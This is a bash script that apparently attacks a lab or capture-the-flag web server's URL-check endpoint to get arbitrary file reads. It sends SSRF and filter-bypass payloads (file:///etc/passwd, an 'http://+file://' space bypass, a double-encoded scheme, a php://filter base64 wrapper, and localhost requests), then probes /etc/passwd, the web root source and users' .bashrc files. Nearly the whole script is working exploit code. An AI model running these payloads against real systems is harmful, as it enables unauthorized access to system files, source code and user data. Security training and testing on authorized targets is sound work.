#!/bin/bash
# web-file-read.sh - Test arbitrary file read via protocol filter bypasses
# Usage: ./web-file-read.sh <target_url> <endpoint> <post_param>
# Example: ./web-file-read.sh http://10.129.234.87/index.php url

TARGET="${1:-http://10.129.234.87/index.php}"
ENDPOINT="$2"
PARAM="${3:-url}"

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: web-file-read.sh <target_url_and_endpoint> <post_param>"
    echo "Example: ./web-file-read.sh http://10.129.234.87/index.php url"
    exit 1
fi

print_result() {
    local desc="$1" data="$2"
    result=$(curl -s -X POST "$TARGET" -d "$PARAM=$data" 2>&1 | sed -n '/outputSection/,/<\/div>/p' | sed 's/<[^>]*>//g' | grep -o 'It is up.*' | sed 's/It is up..*😝//')
    if [ -n "$result" ]; then
        echo "  [+] $desc: $result" | head -c 200
    else
        echo "  [-] $desc: (blocked or empty)"
    fi
}

echo "=== File Read Protocol Bypass ==="
echo "Target: $TARGET"
echo ""

# Test 1: Direct file:// (blocked)
echo "[1] Direct file://"
print_result "file:///etc/passwd" "file:///etc/passwd"

# Test 2: Space bypass (http:// file:///)
echo "[2] Space bypass"
print_result "http space file" "http://+file:///etc/passwd"

# Test 3: URL-encoded protocol
echo "[3] URL-encoded file"
print_result "URL-encoded" "%2566ile:///etc/passwd"

# Test 4: PHP filter wrapper
echo "[4] PHP filter"
print_result "php filter" "php://filter/convert.base64-encode/resource=index.php"

# Test 5: Localhost SSRF
echo "[5] Localhost SSRF"
print_result "localhost" "http://127.0.0.1/"

# Read common files if bypass works
echo ""
echo "=== Common File Reads ==="
for f in /etc/passwd /etc/hostname /var/www/html/index.php /home/*/.bashrc; do
    result=$(curl -s -X POST "$TARGET" -d "$PARAM=http://+file://$f" 2>&1 | sed -n '/outputSection/,/<\/div>/p' | sed 's/<[^>]*>//g' | grep -c "It is up")
    if [ "$result" != "0" ]; then
        echo "  [*] $f accessible"
    fi
done

echo ""
echo "=== Done ==="
